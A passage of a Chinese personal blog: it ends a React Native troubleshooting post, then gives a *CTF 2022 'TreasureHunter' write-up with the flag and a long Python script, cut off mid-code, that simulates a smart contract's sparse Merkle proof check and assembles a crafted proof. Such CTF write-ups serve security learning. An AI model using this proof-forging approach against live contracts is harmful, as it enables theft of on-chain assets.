<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><p><a target="_blank" rel="noopener" href="https://github.com/tradle/react-native-crypto">https://github.com/tradle/react-native-crypto</a></p>
<p>最后一句换成<code>node_modules\.bin\rn-nodeify --hack --install --legacy-peer-deps</code><br>默认的crypto库的方法是基于浏览器内核的，在react-native项目中会报错(例如randomBytes)，使用react-native-randombytes并不能直接解决问题。</p>
<p>安装react-native-crypto后根据教程进行配置，可以使其替代原有的crypto而不用修改其他库的源代码。(simple-peer中实例化Peer遇到此问题)</p>
<p>之后package.json中会出现很多奇奇怪怪的包</p>
<h2 id="一些错误"><a href="#一些错误" class="headerlink" title="一些错误"></a>一些错误</h2><p>出现任何错误 通用解决方案：</p>
<ol>
<li>重启metro</li>
<li>node_modules删了再装</li>
<li>重启电脑</li>
</ol>
<ul>
<li><pre><code>npm ERR! Error: read ECONNRESET
npm ERR!     at TLSWrap.onStreamRead (node:internal/stream_base_commons:217:20) &#123;
npm ERR!   errno: -4077,
npm ERR!   code: &#39;ECONNRESET&#39;,
npm ERR!   syscall: &#39;read&#39;
npm ERR! &#125;
</code></pre>
<p>这个是网络不好 可以多试几次  或者用cnpm 或者换源</p>
</li>
<li><p><code>could not get batchedbridge</code> 重启metro</p>
</li>
<li><p><code>Invariant Violation: Module AppRegistry is not a registered callable module (calling runApplication)</code>重启metro</p>
</li>
<li><p><code>npm ERR! could not determine executable to run</code>仔细看命令 npm莫名其妙会变成npx</p>
</li>
<li><p><code>module could not be found within the project or in these directories:node_modules</code> 重启metro 如果不行删了node_modules再装</p>
</li>
<li><p><code>warn No apps connected. Sending &quot;reload&quot; to all React Native apps failed. Make sure your app is running in the simulator or on a phone connected via USB. info Reloading app...</code><br>这个的原因是app本身有问题 导致一打开就会闪退 或者其他原因根本打不开 和模拟器的连接没有问题  但是找不到任何报错的信息 因此只能控制变量去看;<br>少装几个包就没这个问题了 因此是装了的包 即使代码里没有用 也会导致这个问题;具体是react-native-webrtc要求安卓的minSdkVersion 需要修改android目录下的配置文件</p>
</li>
<li><p><code>&#39;react-native&#39; 不是内部或外部命令，也不是可运行的程序 或批处理文件。</code>这个可能是uninstall的时候多删东西了 直接<code>npm install</code>就行</p>
</li>
<li><p><code>TypeError: undefined is not an object (evaluating &#39;process.version.split&#39;)</code>这个问题并没有解决</p>
<p><a target="_blank" rel="noopener" href="https://github.com/facebook/react-native/issues/30654">https://github.com/facebook/react-native/issues/30654</a></p>
</li>
</ul>
<h2 id="待解决的问题"><a href="#待解决的问题" class="headerlink" title="待解决的问题"></a>待解决的问题</h2><ul>
<li><p>使用路由后导致页面卡死</p>
</li>
<li><p>某些手机下载软件后网络请求错误  可能是手机版本导致禁用了http 可能https可以解决</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32312317/article/details/80868118">React Native: TypeError: Network request failed_翻船现场的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/facebook/react-native/issues/32931">HTTP Fetch fails with “TypeError: Network request failed” &#x3D;&gt; Resolved · Issue #32931 · facebook&#x2F;react-native (github.com)</a></p>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/ctf/sc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/ctf/sc/" class="post-title-link" itemprop="url">TreasureHunter</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-22 20:42:54 / Modified: 20:42:55" itemprop="dateCreated datePublished" datetime="2024-01-22T20:42:54+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>27k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>1:38</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="TreasureHunter"><a href="#TreasureHunter" class="headerlink" title="TreasureHunter"></a>TreasureHunter</h1><p>*CTF 2022 - Ph0t1n1a</p>
<ul>
<li>比赛时间：2022-04-16周六 09:00:00——2022-04-17周日 09:00:00 24h</li>
<li>平台链接：<a target="_blank" rel="noopener" href="https://starctf2022.xctf.org.cn/">https://starctf2022.xctf.org.cn/</a></li>
</ul>
<p>*ctf{9bd0d273037935c5eeaa94968f107622}</p>
<p>enter4次+pickupTreasureChest+findKey 核心是构造proof满足root的检验<br><code>keccak256(abi.encode(l, r))</code>碰撞是不可能的 只能记录每个root生成的记录</p>
<p>用python本地调试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_abi <span class="keyword">import</span> encode_abi</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;http://123.60.45.88:8545&quot;</span>)) </span><br><span class="line">keccak = w3.keccak</span><br><span class="line"></span><br><span class="line">SMT_STACK_SIZE = <span class="number">32</span></span><br><span class="line">DEPTH = <span class="number">160</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cout = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abi</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">assert</span> a!= <span class="number">0</span> <span class="keyword">and</span> b!=<span class="number">0</span></span><br><span class="line">    <span class="comment">#res = encode_abi([&#x27;bytes32&#x27;,&#x27;bytes32&#x27;],[a,b])</span></span><br><span class="line">    res = <span class="string">b&#x27;\x00&#x27;</span>* (<span class="number">32</span>-<span class="built_in">len</span>(a)) + a + <span class="string">b&#x27;\x00&#x27;</span>* (<span class="number">32</span>-<span class="built_in">len</span>(b)) + b</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(res) == <span class="number">64</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcLeaf</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">if</span> a.value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key_hex = <span class="built_in">hex</span>(a.key)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key_hex) &amp; <span class="number">1</span>:</span><br><span class="line">            key_hex = <span class="string">&#x27;0&#x27;</span>+ key_hex</span><br><span class="line">        value_hex = <span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">if</span> a.value == <span class="number">0</span> <span class="keyword">else</span> <span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">        res = keccak(abi(<span class="built_in">bytes</span>.fromhex(key_hex), value_hex))</span><br><span class="line">        <span class="keyword">if</span> cout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;leaf:<span class="subst">&#123;res.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(res) == <span class="number">32</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">l,r</span>):</span><br><span class="line">    <span class="keyword">if</span> l==<span class="number">0</span>:</span><br><span class="line">        res = r</span><br><span class="line">    <span class="keyword">elif</span> r ==<span class="number">0</span>:</span><br><span class="line">        res = l</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = keccak(abi(l, r))</span><br><span class="line">        <span class="keyword">if</span> cout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;merge <span class="subst">&#123;l.<span class="built_in">hex</span>()&#125;</span>,<span class="subst">&#123;r.<span class="built_in">hex</span>()&#125;</span> to <span class="subst">&#123;res.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkGroupSorted</span>(<span class="params">_leaves</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(_leaves) &gt;= <span class="number">1</span></span><br><span class="line">        temp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(_leaves)):</span><br><span class="line">            <span class="keyword">if</span> temp &gt;= <span class="built_in">int</span>(_leaves[i].key):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            </span><br><span class="line">            temp = <span class="built_in">int</span>(_leaves[i].key)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getBit</span>(<span class="params">key,height</span>):</span><br><span class="line">    <span class="keyword">assert</span> height &lt;= DEPTH</span><br><span class="line">    <span class="keyword">return</span> (key &gt;&gt; height) &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copyBit</span>(<span class="params">key,height</span>):</span><br><span class="line">    <span class="keyword">assert</span> height &lt;= DEPTH</span><br><span class="line">    <span class="keyword">return</span> (key &gt;&gt; height) &lt;&lt; height</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parentPath</span>(<span class="params">key,height</span>):</span><br><span class="line">    <span class="keyword">assert</span> height &lt;= DEPTH</span><br><span class="line">    <span class="keyword">return</span> copyBit(key,height+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcRoot</span>(<span class="params">_proofs,_leaves,_root</span>):</span><br><span class="line">    <span class="keyword">assert</span> checkGroupSorted(_leaves)</span><br><span class="line">    stackKeys = []</span><br><span class="line">    stackValues = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(SMT_STACK_SIZE):</span><br><span class="line">        stackKeys.append(<span class="number">0</span>)</span><br><span class="line">        stackValues.append(<span class="number">0</span>)</span><br><span class="line">    proofIndex = <span class="number">0</span>;</span><br><span class="line">    leaveIndex = <span class="number">0</span>;</span><br><span class="line">    stackTop = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> proofIndex &lt; <span class="built_in">len</span>(_proofs):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(_proofs[proofIndex].<span class="built_in">hex</span>(),base=<span class="number">16</span>) == <span class="number">0x4c</span>:</span><br><span class="line">            proofIndex+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">assert</span> stackTop &lt; SMT_STACK_SIZE</span><br><span class="line">            <span class="keyword">assert</span> leaveIndex &lt; <span class="built_in">len</span>(_leaves)</span><br><span class="line">            stackKeys[stackTop] = <span class="built_in">int</span>(_leaves[leaveIndex].key)</span><br><span class="line">            stackValues[stackTop] = calcLeaf(_leaves[leaveIndex])</span><br><span class="line">            stackTop+=<span class="number">1</span></span><br><span class="line">            leaveIndex+=<span class="number">1</span></span><br><span class="line">            <span class="comment">#print(f&#x27;push:&#123;stackKeys[stackTop-1]&#125;,&#123;stackValues[stackTop-1]&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(_proofs[proofIndex].<span class="built_in">hex</span>(),base=<span class="number">16</span>) == <span class="number">0x50</span>:</span><br><span class="line">            proofIndex+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">assert</span> stackTop != <span class="number">0</span></span><br><span class="line">            <span class="keyword">assert</span> proofIndex + <span class="number">2</span> &lt;= <span class="built_in">len</span>(_proofs)</span><br><span class="line">            height = <span class="built_in">int</span>(_proofs[proofIndex].<span class="built_in">hex</span>(),base=<span class="number">16</span>)</span><br><span class="line">            proofIndex += <span class="number">1</span></span><br><span class="line">            currentProof = _proofs[proofIndex]</span><br><span class="line">            proofIndex += <span class="number">1</span></span><br><span class="line">            <span class="keyword">assert</span> currentProof != _root</span><br><span class="line">            <span class="keyword">if</span> getBit(stackKeys[stackTop - <span class="number">1</span>], height) == <span class="number">1</span>:</span><br><span class="line">                stackValues[stackTop - <span class="number">1</span>] = merge(currentProof, stackValues[stackTop - <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stackValues[stackTop - <span class="number">1</span>] = merge(stackValues[stackTop - <span class="number">1</span>], currentProof)</span><br><span class="line">            <span class="comment">#print(stackValues[stackTop - 1])</span></span><br><span class="line">            stackKeys[stackTop - <span class="number">1</span>] = parentPath(stackKeys[stackTop - <span class="number">1</span>], height)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(_proofs[proofIndex].<span class="built_in">hex</span>(),base=<span class="number">16</span>) == <span class="number">0x48</span> :</span><br><span class="line">            proofIndex+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">assert</span> stackTop &gt;= <span class="number">2</span></span><br><span class="line">            <span class="keyword">assert</span> proofIndex &lt; <span class="built_in">len</span>(_proofs)</span><br><span class="line">            height = <span class="built_in">int</span>(_proofs[proofIndex].<span class="built_in">hex</span>(),base=<span class="number">16</span>)</span><br><span class="line">            proofIndex += <span class="number">1</span></span><br><span class="line">            aSet = getBit(stackKeys[stackTop - <span class="number">2</span>], height)</span><br><span class="line">            bSet = getBit(stackKeys[stackTop - <span class="number">1</span>], height)</span><br><span class="line">            stackKeys[stackTop - <span class="number">2</span>] = parentPath(stackKeys[stackTop - <span class="number">2</span>], height)</span><br><span class="line">            stackKeys[stackTop - <span class="number">1</span>] = parentPath(stackKeys[stackTop - <span class="number">1</span>], height)</span><br><span class="line">            <span class="keyword">assert</span> stackKeys[stackTop - <span class="number">2</span>] == stackKeys[stackTop - <span class="number">1</span>] <span class="keyword">and</span> aSet != bSet</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> aSet == <span class="number">1</span>:</span><br><span class="line">                stackValues[stackTop - <span class="number">2</span>] = merge(</span><br><span class="line">                    stackValues[stackTop - <span class="number">1</span>],</span><br><span class="line">                    stackValues[stackTop - <span class="number">2</span>]</span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stackValues[stackTop - <span class="number">2</span>] = merge(</span><br><span class="line">                    stackValues[stackTop - <span class="number">2</span>],</span><br><span class="line">                    stackValues[stackTop - <span class="number">1</span>]</span><br><span class="line">                    )</span><br><span class="line">            stackTop -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span>()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">assert</span> leaveIndex == <span class="built_in">len</span>(_leaves)</span><br><span class="line">    <span class="keyword">assert</span> stackTop == <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> stackValues[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Leaf</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,k,v</span>):</span><br><span class="line">        self.key = k</span><br><span class="line">        self.value = v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    hunters = []</span><br><span class="line">    prevLeaves = []</span><br><span class="line">    nextLeaves = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        hunters.append(<span class="number">0</span>)</span><br><span class="line">        prevLeaves.append(<span class="number">0</span>)</span><br><span class="line">        nextLeaves.append(<span class="number">0</span>)</span><br><span class="line">    hunters[<span class="number">0</span>] = <span class="number">0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e</span></span><br><span class="line">    hunters[<span class="number">1</span>] = <span class="number">0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45</span></span><br><span class="line">    hunters[<span class="number">2</span>] = <span class="number">0x6B175474E89094C44Da98b954EedeAC495271d0F</span></span><br><span class="line">    hunters[<span class="number">3</span>] = <span class="number">0x6B3595068778DD592e39A122f4f5a5cF09C90fE2</span></span><br><span class="line">    hunters[<span class="number">4</span>] = <span class="number">0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B</span></span><br><span class="line">    hunters[<span class="number">5</span>] = <span class="number">0xc00e94Cb662C3520282E6f5717214004A7f26888</span></span><br><span class="line">    hunters[<span class="number">6</span>] = <span class="number">0xD533a949740bb3306d119CC777fa900bA034cd52</span></span><br><span class="line">    hunters[<span class="number">7</span>] = <span class="number">0xdAC17F958D2ee523a2206206994597C13D831ec7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        prevLeaves[i] = Leaf(hunters[i],<span class="number">0</span>)</span><br><span class="line">        nextLeaves[i] = Leaf(hunters[i],<span class="number">1</span>)</span><br><span class="line">    proof = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">        proof.append(<span class="number">0</span>)</span><br><span class="line">    proof[<span class="number">0</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">1</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">2</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">3</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">4</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">5</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000095&#x27;</span></span><br><span class="line">    proof[<span class="number">6</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">7</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000099&#x27;</span></span><br><span class="line">    proof[<span class="number">8</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">9</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class="line">    proof[<span class="number">10</span>] =<span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">11</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">12</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">13</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">14</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">15</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009b&#x27;</span></span><br><span class="line">    proof[<span class="number">16</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">17</span>] = <span 